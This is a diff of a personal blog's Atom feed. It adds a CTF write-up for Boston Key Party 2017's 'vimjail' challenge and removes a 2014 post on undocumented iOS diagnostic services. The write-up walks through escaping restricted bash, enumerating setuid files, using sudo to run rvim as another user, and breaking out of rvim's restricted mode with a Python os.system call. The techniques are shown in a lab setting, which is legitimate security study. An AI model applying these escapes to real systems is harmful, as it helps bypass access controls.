@@ -5,7 +5,7 @@
   
   <link href="https://yous.be/atom.xml" rel="self" type="application/atom+xml" />
   <link href="https://yous.be/" rel="alternate" type="text/html" />
-  <updated>2017-02-20T03:38:11+00:00</updated>
+  <updated>2017-03-01T09:47:46+00:00</updated>
   <id>https://yous.be//</id>
 
   
@@ -24,6 +24,187 @@
     </author>
   
 
+  
+  
+    <entry>
+      
+      <title type="html">Boston Key Party CTF 2017: vimjail write-up</title>
+      
+      <link href="https://yous.be/2017/03/01/boston-key-party-ctf-2017-vimjail-write-up/" rel="alternate" type="text/html" title="Boston Key Party CTF 2017: vimjail write-up" />
+      <published>2017-03-01T09:34:52+00:00</published>
+      <updated>2017-03-01T09:34:52+00:00</updated>
+      <id>https://yous.be/2017/03/01/boston-key-party-ctf-2017-vimjail-write-up</id>
+      <content type="html" xml:base="https://yous.be/2017/03/01/boston-key-party-ctf-2017-vimjail-write-up/">&lt;h2&gt;vimjail (pwn 150)&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh ctfuser@ec2-54-200-176-5.us-west-2.compute.amazonaws.com&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;password: &lt;code class=&quot;highlighter-rouge&quot;&gt;loginPWforVimJail&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+  &lt;p&gt;Can you read the flag?&lt;/p&gt;
+
+  &lt;p&gt;&lt;em&gt;UPDATES&lt;/em&gt;&lt;/p&gt;
+  &lt;ul&gt;
+    &lt;li&gt;(13:38 UTC Saturday): The flag is not in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;.&lt;/li&gt;
+    &lt;li&gt;(13:31 EST Saturday): new ip&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;h2&gt;Looking around&lt;/h2&gt;
+
+&lt;p&gt;Well, you would do &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; first when you logged in, so do we. And there was
+&lt;code class=&quot;highlighter-rouge&quot;&gt;~/flagReader&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;ctfuser@ip-172-31-31-196:~$ &lt;/span&gt;ls -als /home/ctfuser/flagReader
+12 ---S--x--- 1 topsecretuser secretuser 8768 Feb 25 08:42 /home/ctfuser/flagReader
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;If you try completion by pressing Tab key or try to move around using &lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt;, it
+fails with an error message from rbash. It’s restricted bash, but you can simply
+run &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; to escape.&lt;/p&gt;
+
+&lt;p&gt;While moving around, we found nothing special without &lt;code class=&quot;highlighter-rouge&quot;&gt;/.flag&lt;/code&gt;. Also there were
+some &lt;code class=&quot;highlighter-rouge&quot;&gt;.s[a-z][a-z]&lt;/code&gt; files under &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/tmp/&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt;, created by
+&lt;code class=&quot;highlighter-rouge&quot;&gt;secretuser&lt;/code&gt;. But there are not in fixed location when the problem server was
+changed, so we thought there would be a way to run Vim under &lt;code class=&quot;highlighter-rouge&quot;&gt;secretuser&lt;/code&gt;’s
+permission.&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;ctfuser@ip-172-31-31-196:~$ &lt;/span&gt;ls -als /.flag
+4 -r-------- 1 topsecretuser topsecretuser 39 Feb 25 08:42 /.flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We also tried to find setuid or setgid files, but there was only the previous
+&lt;code class=&quot;highlighter-rouge&quot;&gt;flagReader&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;ctfuser@ip-172-31-31-196:/tmp$ &lt;/span&gt;find / -perm -4000 -o -perm -2000 -type f 2&amp;gt;/dev/null
+/bin/ping
+/bin/ping6
+/bin/fusermount
+/bin/umount
+/bin/su
+/bin/mount
+/bin/ntfs-3g
+/sbin/unix_chkpwd
+/sbin/pam_extrausers_chkpwd
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/crontab
+/usr/bin/newuidmap
+/usr/bin/at
+/usr/bin/chage
+/usr/bin/sudo
+/usr/bin/bsd-write
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/expiry
+/usr/bin/newgrp
+/usr/bin/screen
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/ssh-agent
+/usr/bin/passwd
+/usr/bin/mlocate
+/home/ctfuser/flagReader
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2&gt;Jump into Vim&lt;/h2&gt;
+
+&lt;p&gt;Suddenly &lt;a href=&quot;http://zzoru.github.io&quot;&gt;@zzoru&lt;/a&gt; mentioned that we can run
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -u secretuser /usr/bin/rvim&lt;/code&gt;. Later, I learned that &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; has &lt;code class=&quot;highlighter-rouge&quot;&gt;-l&lt;/code&gt;,
+&lt;code class=&quot;highlighter-rouge&quot;&gt;--list&lt;/code&gt; option:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-man&quot;&gt;-l, --list  If no command is specified, list the allowed (and
+            forbidden) commands for the invoking user (or the user
+            specified by the -U option) on the current host.  A longer
+            list format is used if this option is specified multiple
+            times and the security policy supports a verbose output
+            format.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So now we’re able to run Vim under &lt;code class=&quot;highlighter-rouge&quot;&gt;secretuser&lt;/code&gt;’s permission!&lt;/p&gt;
+
+&lt;h2&gt;rvim&lt;/h2&gt;
+
+&lt;p&gt;So, what’s rvim? You can see the description of it by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;:help rvim&lt;/code&gt; in
+Vim:&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;rvim&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;vim&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;Z      Like &lt;span class=&quot;s2&quot;&gt;&quot;vim&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; but &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; restricted &lt;span class=&quot;k&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;see &lt;span class=&quot;p&quot;&gt;|-&lt;/span&gt;Z&lt;span class=&quot;p&quot;&gt;|)&lt;/span&gt;   *&lt;span class=&quot;k&quot;&gt;rvim&lt;/span&gt;*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Again, &lt;code class=&quot;highlighter-rouge&quot;&gt;:help -Z&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                                *&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;Z* *restricted&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;mode&lt;/span&gt;* *E145*
+&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;Z              Restricted &lt;span class=&quot;k&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;  All commands that &lt;span class=&quot;k&quot;&gt;make&lt;/span&gt; use of an external
+                &lt;span class=&quot;k&quot;&gt;shell&lt;/span&gt; are disabled&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;  This includes suspending with CTRL&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;Z&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;c&quot;&gt;&quot;:sh&quot;, filtering, the system() function, backtick expansion,&lt;/span&gt;
+                delete&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; rename&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; mkdir&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; writefile&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; libcall&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
+                job_start&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; etc&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;not &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; Vi&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Yes, it’s the Vim version of rbash. We can’t run &lt;code class=&quot;highlighter-rouge&quot;&gt;:!/home/ctfuser/flagReader&lt;/code&gt;,
+or &lt;code class=&quot;highlighter-rouge&quot;&gt;:set shell=/home/ctfuser/flagReader | shell&lt;/code&gt; in restricted mode. Well, this
+is the main content of vimjail.&lt;/p&gt;
+
+&lt;h2&gt;Jailbreak&lt;/h2&gt;
+
+&lt;p&gt;Seeing &lt;code class=&quot;highlighter-rouge&quot;&gt;:version&lt;/code&gt;, we found that it has extra patch 8.0.0056, so
+&lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2016-1248/&quot;&gt;CVE-2016-1248&lt;/a&gt; exploiting
+modeline would also not work. However, it’s containing &lt;code class=&quot;highlighter-rouge&quot;&gt;+python3&lt;/code&gt; support. So
+first we tried to execute Python with something like &lt;code class=&quot;highlighter-rouge&quot;&gt;:python3 print(1)&lt;/code&gt;. And
+that worked!&lt;/p&gt;
+
+&lt;p&gt;We just executed &lt;code class=&quot;highlighter-rouge&quot;&gt;flagReader&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;python3&lt;/span&gt; import os; os&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;system&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/home/ctfuser/flagReader'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then it prints the flag. So the flag is
+&lt;code class=&quot;highlighter-rouge&quot;&gt;flag{rVim_is_no_silverbullet!!!111elf}&lt;/code&gt;.&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Yous</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="CTF" />
+      
+
+      
+
+      
+        <summary type="html">vimjail (pwn 150) ssh ctfuser@ec2-54-200-176-5.us-west-2.compute.amazonaws.com password: loginPWforVimJail Can you read the flag? UPDATES (13:38 UTC Saturday): The flag is not in /tmp. (13:31 EST Saturday): new ip Looking around Well, you would do ls first when you logged in, so do we. And there was ~/flagReader. ctfuser@ip-172-31-31-196:~$ ls -als /home/ctfuser/flagReader 12 ---S--x--- 1 topsecretuser secretuser 8768 Feb 25 08:42 /home/ctfuser/flagReader If you try completion by pressing Tab key or try to move around using cd, it fails with an error message from rbash. It’s restricted bash, but you can simply run bash to escape. While moving around, we found nothing special without /.flag. Also there were some .s[a-z][a-z] files under /var/tmp/ and /tmp/, created by secretuser. But there are not in fixed location when the problem server was changed, so we thought there would be a way to run Vim under secretuser’s permission. ctfuser@ip-172-31-31-196:~$ ls -als /.flag 4 -r-------- 1 topsecretuser topsecretuser 39 Feb 25 08:42 /.flag We also tried to find setuid or setgid files, but there was only the previous flagReader. ctfuser@ip-172-31-31-196:/tmp$ find / -perm -4000 -o -perm -2000 -type f 2&amp;gt;/dev/null /bin/ping /bin/ping6 /bin/fusermount /bin/umount /bin/su /bin/mount /bin/ntfs-3g /sbin/unix_chkpwd /sbin/pam_extrausers_chkpwd /usr/lib/x86_64-linux-gnu/utempter/utempter /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/openssh/ssh-keysign /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/crontab /usr/bin/newuidmap /usr/bin/at /usr/bin/chage /usr/bin/sudo /usr/bin/bsd-write /usr/bin/pkexec /usr/bin/chfn /usr/bin/expiry /usr/bin/newgrp /usr/bin/screen /usr/bin/chsh /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/ssh-agent /usr/bin/passwd /usr/bin/mlocate /home/ctfuser/flagReader</summary>
+      
+
+      
+      
+    </entry>
+  
   
   
     <entry>
@@ -3964,65 +4145,6 @@ You may want to close only the current tab with &lt;code class=&quot;highlighter
       
 
       
-      
-    </entry>
-  
-  
-  
-    <entry>
-      
-      <title type="html">Undocumented iOS functions allow monitoring of personal data, expert says →</title>
-      
-      <link href="https://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says/" rel="alternate" type="text/html" title="Undocumented iOS functions allow monitoring of personal data, expert says" />
-      <published>2014-07-22T13:19:14+00:00</published>
-      <updated>2014-07-22T13:19:14+00:00</updated>
-      <id>https://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says</id>
-      <content type="html" xml:base="https://yous.be/2014/07/22/undocumented-ios-functions-allow-monitoring-of-personal-data-expert-says/">&lt;blockquote&gt;
-  &lt;p&gt;“Backdoor” can be abused by gov’t agents and ex-lovers to gain persistent access.&lt;/p&gt;
-
-  &lt;p&gt;Apple has endowed iPhones with undocumented functions that allow unauthorized people in privileged positions to wirelessly connect and harvest pictures, text messages, and other sensitive data without entering a password or PIN, a forensic scientist warned over the weekend.&lt;/p&gt;
-
-  &lt;p&gt;Zdziarski said the service that raises the most concern is known as com.apple.mobile.file_relay. It dishes out a staggering amount of data—including account data for e-mail, Twitter, iCloud, and other services, a full copy of the address book including deleted entries, the user cache folder, logs of geographic positions, and a complete dump of the user photo album—all without requiring a backup password to be entered. He said two other services dubbed com.apple.pcapd and com.apple.mobile.house_arrest may have legitimate uses for app developers or support people but can also be used to spy on users by government agencies or even jilted ex-lovers. The Pcapd service, for instance, allows people to wirelessly monitor all network traffic traveling into and out of the device, even when it’s not running in a special developer or support mode. House_arrest, meanwhile, allows the copying of sensitive files and documents from Twitter, Facebook, and many other applications.&lt;/p&gt;
-
-  &lt;p&gt;&lt;img src=&quot;/images/2014/07/22/pcapd1.jpg&quot; alt=&quot;com.apple.pcapd&quot; title=&quot;com.apple.pcapd&quot; /&gt;&lt;/p&gt;
-
-  &lt;p&gt;Slides of Zdziarski’s talk, titled &lt;strong&gt;Identifying Back Doors, Attack Points, and Surveillance Mechanisms in iOS Devices&lt;/strong&gt; are &lt;a href=&quot;https://pentest.com/ios_backdoors_attack_points_surveillance_mechanisms.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Also check the page about &lt;a href=&quot;http://support.apple.com/kb/HT6331&quot;&gt;iOS: About diagnostic capabilities&lt;/a&gt; on Apple Support:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Each of these diagnostic capabilities requires the user to have unlocked their device and agreed to trust another computer. Any data transmitted between the iOS device and trusted computer is encrypted with keys not shared with Apple. For users who have enabled iTunes Wi-Fi Sync on a trusted computer, these services may also be accessed wirelessly by that computer.&lt;/p&gt;
-&lt;/blockquote&gt;</content>
-
-      
-      
-      
-      
-      
-
-      
-        <author>
-            <name>Yous</name>
-          
-          
-        </author>
-      
-
-      
-        <category term="iOS" />
-      
-
-      
-
-      
-        <summary type="html">“Backdoor” can be abused by gov’t agents and ex-lovers to gain persistent access. Apple has endowed iPhones with undocumented functions that allow unauthorized people in privileged positions to wirelessly connect and harvest pictures, text messages, and other sensitive data without entering a password or PIN, a forensic scientist warned over the weekend. Zdziarski said the service that raises the most concern is known as com.apple.mobile.file_relay. It dishes out a staggering amount of data—including account data for e-mail, Twitter, iCloud, and other services, a full copy of the address book including deleted entries, the user cache folder, logs of geographic positions, and a complete dump of the user photo album—all without requiring a backup password to be entered. He said two other services dubbed com.apple.pcapd and com.apple.mobile.house_arrest may have legitimate uses for app developers or support people but can also be used to spy on users by government agencies or even jilted ex-lovers. The Pcapd service, for instance, allows people to wirelessly monitor all network traffic traveling into and out of the device, even when it’s not running in a special developer or support mode. House_arrest, meanwhile, allows the copying of sensitive files and documents from Twitter, Facebook, and many other applications. Slides of Zdziarski’s talk, titled Identifying Back Doors, Attack Points, and Surveillance Mechanisms in iOS Devices are here. Also check the page about iOS: About diagnostic capabilities on Apple Support: Each of these diagnostic capabilities requires the user to have unlocked their device and agreed to trust another computer. Any data transmitted between the iOS device and trusted computer is encrypted with keys not shared with Apple. For users who have enabled iTunes Wi-Fi Sync on a trusted computer, these services may also be accessed wirelessly by that computer.</summary>
-      
-
-      
-      
-        
-        <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://yous.be/images/2014/07/22/pcapd1.jpg" />
       
     </entry>
   
